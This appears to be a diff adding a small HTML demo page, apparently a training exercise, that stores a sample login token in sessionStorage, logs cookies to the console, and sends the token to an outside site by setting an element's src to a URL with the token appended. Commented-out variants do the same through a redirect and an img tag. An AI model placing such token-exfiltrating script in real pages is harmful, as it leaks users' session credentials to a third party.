@@ -1,0 +1,22 @@
+<script>
+	localStorage.setItem("item", "xxxxxx");
+	sessionStorage.setItem("mylogintoken", "x982u39q83lkjalkrjlkajdsf");
+	console.log("Showing Cookies.........................");
+	console.log(document)
+	console.log(document.cookie)
+	console.log(sessionStorage.getItem("mylogintoken"));
+	//	window.location = "https://wwww.vinsys.com?token="
+	//		+ sessionStorage.getItem("mylogintoken")
+</script>
+
+<h1>Cookies</h1>
+
+<script>
+/* 	var v = document.createElement("img")
+	v.setAttribute("src") = "https://www.vinsys.com?token="
+			+ sessionStorage.getItem("mylogintoken"); */
+
+	var e = document.getElementById("testid");
+	e.src = "https://www.vinsys.com?token="
+			+ sessionStorage.getItem("mylogintoken");
+</script>
